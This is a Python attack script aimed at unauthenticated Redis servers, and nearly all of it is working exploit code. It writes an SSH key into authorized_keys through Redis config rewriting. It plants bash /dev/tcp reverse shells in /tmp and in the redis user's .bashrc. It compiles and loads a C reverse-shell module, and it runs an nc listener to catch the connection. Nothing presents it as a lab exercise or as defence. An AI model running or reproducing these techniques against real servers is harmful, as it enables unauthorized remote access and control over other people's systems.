#!/usr/bin/env python3
import os
import subprocess
import time
from termcolor import colored

# Global configurations
redis_ip = "remoteip"  # Target Redis IP
local_ip = "localhost"  # Your local machine IP for reverse shell
reverse_shell_port = 4444
ssh_key_file = os.path.expanduser("~/.ssh/id_rsa.pub")
workspace_dir = "/root/redis_exploit"
exploit_scripts_dir = "/tmp"
reverse_shell_file = "reverse_shell.so"
verbose_mode = True

def run_command(command, description):
    """Runs a shell command and returns the output."""
    try:
        if verbose_mode:
            print(colored(f"\tExecuting: {description}", "blue"))
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        if verbose_mode:
            print(colored(f"\t{description} succeeded", "green"))
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(colored(f"\tError: {description} failed with error: {e.stderr}", "red"))
        return None

def create_workspace():
    """Create a workspace directory for the exploit."""
    if not os.path.exists(workspace_dir):
        os.makedirs(workspace_dir)
        print(colored(f"\tWorkspace created at {workspace_dir}", "green"))

def start_reverse_shell_listener():
    """Start a netcat listener for the reverse shell in a screen session."""
    listener_cmd = f"screen -dmS redis_reverse_shell nc -lvnp {reverse_shell_port}"
    run_command(listener_cmd, "Starting reverse shell listener with screen")

def check_listener_connection():
    """Check if a reverse shell connection is established."""
    print(colored("\nChecking for reverse shell connection...", "yellow"))
    check_cmd = f"lsof -i TCP:{reverse_shell_port} | grep 'ESTABLISHED'"
    while True:
        output = run_command(check_cmd, "Checking reverse shell connection")
        if output:
            print(colored(f"\nReverse shell connection established! Session active.", "green"))
            return True
        print(colored(f"\nNo reverse shell connection yet. Waiting...", "yellow"))
        time.sleep(5)  # Check every 5 seconds

def gather_redis_info():
    """Gather Redis information for exploitation."""
    print(colored(f"\nEnumerating Redis information on {redis_ip}...", "yellow"))
    config_output = run_command(f"redis-cli -h {redis_ip} config get *", "Getting Redis configuration")
    if config_output:
        with open(f"{workspace_dir}/redis_config.txt", "w") as f:
            f.write(config_output)
        print(colored("\tRedis configuration saved.", "green"))

def try_ssh_key_injection():
    """Attempt to inject an SSH key into the Redis server."""
    print(colored(f"\nTrying SSH key injection on {redis_ip}...", "yellow"))
    
    # Set directory to Redis .ssh folder and inject key
    run_command(f"redis-cli -h {redis_ip} config set dir /var/lib/redis/.ssh", "Setting Redis working directory to .ssh")
    run_command(f"redis-cli -h {redis_ip} config set dbfilename authorized_keys", "Setting Redis dbfilename to authorized_keys")
    run_command(f"cat {ssh_key_file} | redis-cli -h {redis_ip} -x set pwn", "Uploading SSH key to Redis")
    run_command(f"redis-cli -h {redis_ip} save", "Saving Redis database")

    # Try SSH login
    print(colored("\tAttempting to log in via SSH...", "yellow"))
    ssh_cmd = f"ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa redis@{redis_ip}"
    result = run_command(ssh_cmd, "Attempting SSH login")
    
    if result:
        print(colored(f"\tSSH login succeeded! You have access.", "green"))
        return True
    else:
        print(colored(f"\tSSH key injection failed or permissions are incorrect.", "red"))
        return False

def inject_reverse_shell():
    """Inject a reverse shell script via Redis."""
    print(colored(f"\nInjecting reverse shell script on {redis_ip}...", "yellow"))
    
    # Set working directory to /tmp and inject reverse shell script
    reverse_shell_script = f'bash -i >& /dev/tcp/{local_ip}/{reverse_shell_port} 0>&1'
    run_command(f"redis-cli -h {redis_ip} config set dir {exploit_scripts_dir}", "Setting Redis working directory to /tmp")
    run_command(f"redis-cli -h {redis_ip} config set dbfilename exploit.sh", "Setting Redis dbfilename to exploit.sh")
    run_command(f"echo '{reverse_shell_script}' | redis-cli -h {redis_ip} -x set pwn", "Uploading reverse shell script to Redis")
    run_command(f"redis-cli -h {redis_ip} save", "Saving Redis database")

def compile_reverse_shell_module():
    """Compile the reverse shell shared object."""
    c_code = f"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>

    void reverse_shell() {{
        int sock;
        struct sockaddr_in serv_addr;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = inet_addr("{local_ip}");
        serv_addr.sin_port = htons({reverse_shell_port});

        connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
        dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
        execl("/bin/sh", "sh", NULL);
    }}
    """
    c_file = os.path.join(workspace_dir, "reverse_shell.c")
    so_file = os.path.join(workspace_dir, reverse_shell_file)
    
    with open(c_file, "w") as f:
        f.write(c_code)
    
    run_command(f"gcc -shared -fPIC -o {so_file} {c_file}", "Compiling reverse shell shared object")

def try_module_exploit():
    """Try using Redis Modules for code execution."""
    print(colored(f"\nTrying Redis Module Exploit...", "yellow"))
    
    # Compile and upload the malicious shared object
    compile_reverse_shell_module()
    run_command(f"redis-cli -h {redis_ip} config set dir /tmp", "Setting Redis working directory to /tmp")
    run_command(f"redis-cli -h {redis_ip} config set dbfilename {reverse_shell_file}", "Setting Redis dbfilename to reverse_shell.so")
    run_command(f"cat {workspace_dir}/{reverse_shell_file} | redis-cli -h {redis_ip} -x set pwn", "Uploading malicious shared object")
    run_command(f"redis-cli -h {redis_ip} save", "Saving Redis database")

    # Load the malicious module
    result = run_command(f"redis-cli -h {redis_ip} module load /tmp/{reverse_shell_file}", "Loading reverse shell module")
    if result:
        print(colored(f"\tModule loaded! Reverse shell should connect to {local_ip}:{reverse_shell_port}.", "green"))
        return True
    else:
        print(colored(f"\tModule loading failed.", "red"))
        return False

def inject_bashrc_reverse_shell():
    """Inject reverse shell into Redis user's .bashrc."""
    print(colored(f"\nInjecting reverse shell into Redis user's .bashrc...", "yellow"))

    # Set working directory to Redis home and inject into .bashrc
    reverse_shell_bashrc = f'bash -i >& /dev/tcp/{local_ip}/{reverse_shell_port} 0>&1'
    run_command(f"redis-cli -h {redis_ip} config set dir /var/lib/redis", "Setting Redis working directory to /var/lib/redis")
    run_command(f"redis-cli -h {redis_ip} config set dbfilename .bashrc", "Setting Redis dbfilename to .bashrc")
    run_command(f"echo '{reverse_shell_bashrc}' | redis-cli -h {redis_ip} -x set pwn", "Injecting reverse shell into .bashrc")
    run_command(f"redis-cli -h {redis_ip} save", "Saving Redis database")

def main():
    """Main function to control the exploitation flow."""
    create_workspace()
    gather_redis_info()
    
    # Start reverse shell listener
    start_reverse_shell_listener()

    # Try SSH key injection
    if try_ssh_key_injection():
        print(colored(f"\nSSH key injection successful, stopping script.", "green"))
        return

    # Try Reverse Shell Injection
    inject_reverse_shell()

    # Try Redis Module Exploit
    if try_module_exploit():
        print(colored(f"\nModule exploit successful, checking for connection...", "green"))
        if check_listener_connection():
            return  # Stop if the reverse shell is established

    # Try injecting reverse shell into .bashrc if all else fails
    inject_bashrc_reverse_shell()

    print(colored(f"\nAll exploitation attempts completed. Checking for shell connection...", "yellow"))
    check_listener_connection()

if __name__ == "__main__":
    main()
